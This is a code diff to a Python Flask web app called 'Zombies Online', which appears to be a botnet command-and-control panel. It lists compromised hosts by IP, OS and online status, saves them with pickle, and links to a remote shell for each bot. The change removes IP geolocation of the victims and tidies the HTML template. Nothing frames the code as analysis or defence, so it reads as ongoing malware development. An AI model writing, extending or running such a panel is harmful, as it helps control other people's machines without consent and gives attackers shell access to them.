@@ -5,7 +5,6 @@ import time
 import platform
 import os
 from flask import Flask, render_template_string, request, redirect, url_for, Response
-import geocoder
 
 app = Flask(__name__)
 HOST = '0.0.0.0'
@@ -16,9 +15,9 @@ sessions = {}
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang=\"en\">
+<html lang="en">
 <head>
-    <meta charset=\"UTF-8\">
+    <meta charset="UTF-8">
     <title>Zombies Online</title>
     <style>
         body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
@@ -38,7 +37,7 @@ HTML_TEMPLATE = """
     <h1>Zombies Online: {{ online_count }}</h1>
     <table>
         <tr>
-            <th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Shell</th><th>Country</th>
+            <th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Shell</th>
         </tr>
         {% for bot_id, info in bots.items() %}
         <tr>
@@ -46,8 +45,7 @@ HTML_TEMPLATE = """
             <td class="{{ 'online' if info['status'] == 'Online' else 'offline' }}">{{ info['status'] }}</td>
             <td>{{ info['ip'] }}</td>
             <td>{{ info['os'] }}</td>
-            <td><a href="/shell-id={{ bot_id }}">🕹️</a></td>
-            <td>{{ info['country'] }}</td>
+            <td><a href="/shell-id={{ bot_id }}">🖹</a></td>
         </tr>
         {% endfor %}
     </table>
@@ -76,15 +74,12 @@ def load_bots():
             bots = pickle.load(f)
 
 def update_bot(ip, os_name):
-    g = geocoder.ip(ip)
-    country = g.country or "Unknown"
     for bot_id, info in bots.items():
         if info['ip'] == ip:
             bots[bot_id].update({
                 'status': 'Online',
                 'last_seen': time.time(),
-                'os': os_name,
-                'country': country
+                'os': os_name
             })
             save_bots()
             return bot_id
@@ -93,8 +88,7 @@ def update_bot(ip, os_name):
         'ip': ip,
         'status': 'Online',
         'last_seen': time.time(),
-        'os': os_name,
-        'country': country
+        'os': os_name
     }
     save_bots()
     return bot_id
